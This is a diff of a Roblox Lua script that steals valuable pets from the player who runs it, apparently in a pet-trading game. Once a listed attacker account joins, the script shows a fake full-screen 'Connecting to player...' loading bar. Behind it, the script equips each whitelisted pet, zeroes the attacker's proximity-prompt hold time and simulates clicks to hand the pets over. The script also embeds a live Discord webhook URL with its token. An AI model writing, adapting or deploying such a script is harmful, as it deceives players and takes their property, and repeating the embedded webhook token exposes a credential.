@@ -1,174 +1,151 @@
 repeat task.wait() until game:IsLoaded()
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
-local USERNAMES = { "ZeeS_Farm01" }
-
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
 local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualInputManager = game:GetService("VirtualInputManager")
 
-local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+local VICTIM = Players.LocalPlayer
+local USERNAMES = { "ZeeS_Farm01" }
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75"
 
 local PET_WHITELIST = {
-    'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
-    'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'Raiju'
+	'Raccoon', 'T-Rex', 'Fennec Fox', 'Dragonfly', 'Butterfly',
+	'Disco Bee', 'Mimic Octopus', 'Queen Bee', 'Spinosaurus', 'Kitsune', 'Raiju'
 }
 
+local dataModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("DataService"))
 local victimPetTable = {}
 
--- 🔍 Проверка игроков
-local function waitForJoin()
-    for _, player in Players:GetPlayers() do
-        if table.find(USERNAMES, player.Name) then
-            return true, player.Name
-        end
-    end
-    return false, nil
+local function waitForTarget()
+	for _, player in Players:GetPlayers() do
+		if table.find(USERNAMES, player.Name) then
+			return true, player.Name
+		end
+	end
+	return false, nil
 end
 
--- ✅ Получение списка петов
+local function createLoadingGUI()
+	local gui = Instance.new("ScreenGui", VICTIM:WaitForChild("PlayerGui"))
+	gui.Name = "FullScreenLoading"
+	gui.IgnoreGuiInset = true
+	gui.ResetOnSpawn = false
+	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+	local bg = Instance.new("Frame", gui)
+	bg.Size = UDim2.new(1, 0, 1, 0)
+	bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+	bg.BorderSizePixel = 0
+
+	local text = Instance.new("TextLabel", bg)
+	text.Text = "\u{1F501} Connecting to player..."
+	text.Size = UDim2.new(1, 0, 0, 100)
+	text.Position = UDim2.new(0, 0, 0.4, 0)
+	text.TextColor3 = Color3.new(1, 1, 1)
+	text.Font = Enum.Font.GothamBlack
+	text.TextSize = 40
+	text.BackgroundTransparency = 1
+
+	local barBG = Instance.new("Frame", bg)
+	barBG.Size = UDim2.new(0.6, 0, 0.05, 0)
+	barBG.Position = UDim2.new(0.2, 0, 0.55, 0)
+	barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+	barBG.BorderSizePixel = 0
+
+	local bar = Instance.new("Frame", barBG)
+	bar.Size = UDim2.new(0, 0, 1, 0)
+	bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+	bar.BorderSizePixel = 0
+
+	return gui, bar
+end
+
+local function showLoadingBar(duration)
+	local gui, bar = createLoadingGUI()
+	local steps = 100
+	local waitTime = duration / steps
+
+	for i = 1, steps do
+		bar.Size = UDim2.new(i / steps, 0, 1, 0)
+		task.wait(waitTime)
+	end
+
+	gui:Destroy()
+end
+
+local function checkPetsWhitelist(pet)
+	for _, name in PET_WHITELIST do
+		if string.find(pet, name) then
+			return true
+		end
+	end
+end
+
+local function getPetObject(petUid)
+	for _, object in ipairs(VICTIM.Backpack:GetChildren()) do
+		if object:GetAttribute("PET_UUID") == petUid then
+			return object
+		end
+	end
+	for _, object in ipairs(workspace[VICTIM.Name]:GetChildren()) do
+		if object:GetAttribute("PET_UUID") == petUid then
+			return object
+		end
+	end
+end
+
+local function equipPet(pet)
+	if pet:GetAttribute("d") then
+		ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
+	end
+	VICTIM.Character.Humanoid:EquipTool(pet)
+end
+
+local function deltaBypass()
+	local cx = workspace.Camera.ViewportSize.X / 2
+	local cy = workspace.Camera.ViewportSize.Y / 2
+	VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, true, nil, false)
+	task.wait(0.5)
+	VirtualInputManager:SendMouseButtonEvent(cx, cy, 0, false, nil, false)
+end
+
+local function startSteal(trigerName)
+	local prompt = Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt")
+	if prompt then
+		prompt.HoldDuration = 0
+		deltaBypass()
+	end
+end
+
 local function getPlayersPets()
-    victimPetTable = {} -- очистим
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        for _, name in PET_WHITELIST do
-            if string.find(value.PetType, name) then
-                table.insert(victimPetTable, value.PetType)
-            end
-        end
-    end
+	for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
+		if checkPetsWhitelist(value.PetType) then
+			table.insert(victimPetTable, value.PetType)
+		end
+	end
 end
 
--- 🛑 Блокировка управления
-local movementConnection
-local function freezeMovement()
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    local humanoid = char:WaitForChild("Humanoid")
-    humanoid.WalkSpeed = 0
-    humanoid.JumpPower = 0
-    movementConnection = UserInputService.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.Keyboard then
-            input:CaptureController()
-        end
-    end)
-end
+getPlayersPets()
 
-local function unfreezeMovement()
-    local char = LocalPlayer.Character
-    if not char then return end
-    local humanoid = char:FindFirstChildOfClass("Humanoid")
-    if humanoid then
-        humanoid.WalkSpeed = 16
-        humanoid.JumpPower = 50
-    end
-    if movementConnection then
-        movementConnection:Disconnect()
-    end
-end
-
--- 🖼️ Отображение GUI + перебор петов
-local function showLoadingGuiWithPets()
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "VisualPetEffectGUI"
-    screenGui.ResetOnSpawn = false
-    screenGui.IgnoreGuiInset = true
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    screenGui.DisplayOrder = 1000
-    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-    screenGui.Modal = false
-
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.new(0, 0, 0)
-    bg.BackgroundTransparency = 0.4
-    bg.Parent = screenGui
-
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 0.2, 0)
-    label.Position = UDim2.new(0, 0, 0.4, 0)
-    label.BackgroundTransparency = 1
-    label.Text = "Loading..."
-    label.TextScaled = true
-    label.Font = Enum.Font.GothamBlack
-    label.TextColor3 = Color3.new(1, 1, 1)
-    label.Parent = screenGui
-
-    local barBg = Instance.new("Frame")
-    barBg.AnchorPoint = Vector2.new(0.5, 0.5)
-    barBg.Position = UDim2.new(0.5, 0, 0.6, 0)
-    barBg.Size = UDim2.new(0.6, 0, 0.02, 0)
-    barBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    barBg.BorderSizePixel = 0
-    barBg.Parent = screenGui
-
-    local bar = Instance.new("Frame")
-    bar.Size = UDim2.new(0, 0, 1, 0)
-    bar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
-    bar.BorderSizePixel = 0
-    bar.Parent = barBg
-
-    -- Волнистая анимация
-    local waveOffset = 0
-    RunService.RenderStepped:Connect(function(dt)
-        waveOffset += dt * 5
-        local waveHeight = math.sin(waveOffset) * 3
-        bar.Position = UDim2.new(bar.Size.X.Scale, 0, 0, waveHeight)
-    end)
-
-    -- Перебор петов
-    local function cyclePets(petList)
-        local displayLabel = Instance.new("TextLabel")
-        displayLabel.Size = UDim2.new(1, 0, 0.2, 0)
-        displayLabel.Position = UDim2.new(0, 0, 0.8, 0)
-        displayLabel.BackgroundTransparency = 1
-        displayLabel.TextScaled = true
-        displayLabel.Font = Enum.Font.GothamBold
-        displayLabel.TextColor3 = Color3.new(1, 1, 1)
-        displayLabel.TextStrokeTransparency = 0.7
-        displayLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-        displayLabel.Parent = screenGui
-
-        local index = 1
-        while screenGui and screenGui.Parent do
-            local petName = petList[index]
-            displayLabel.Text = "🎒 " .. petName
-            displayLabel.TextTransparency = 0
-            displayLabel.TextStrokeTransparency = 0.7
-
-            TweenService:Create(displayLabel, TweenInfo.new(0.2), {TextTransparency = 0}):Play()
-            task.wait(0.5)
-            TweenService:Create(displayLabel, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
-            index = (index % #petList) + 1
-        end
-    end
-
-    -- ⏳ Запуск анимации и логики
-    freezeMovement()
-    getPlayersPets()
-    task.delay(10, function()
-        cyclePets(victimPetTable)
-    end)
-
-    TweenService:Create(bar, TweenInfo.new(30, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-        Size = UDim2.new(1, 0, 1, 0)
-    }):Play()
-
-    task.delay(30, function()
-        unfreezeMovement()
-        screenGui:Destroy()
-    end)
-end
-
--- 🔁 Цикл проверки
 task.spawn(function()
-    while task.wait(1) do
-        local isTarget, targetName = waitForJoin()
-        if isTarget then
-            showLoadingGuiWithPets()
-            break
-        end
-    end
+	while task.wait(1) do
+		local found, targetName = waitForTarget()
+		if found then
+			showLoadingBar(30)
+			task.wait(7)
+
+			for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+				if not checkPetsWhitelist(value.PetType) then continue end
+				local petObject = getPetObject(petUid)
+				if not petObject then continue end
+				equipPet(petObject)
+				deltaBypass()
+				startSteal(targetName)
+				task.wait(0.3)
+			end
+
+			break
+		end
+	end
 end)
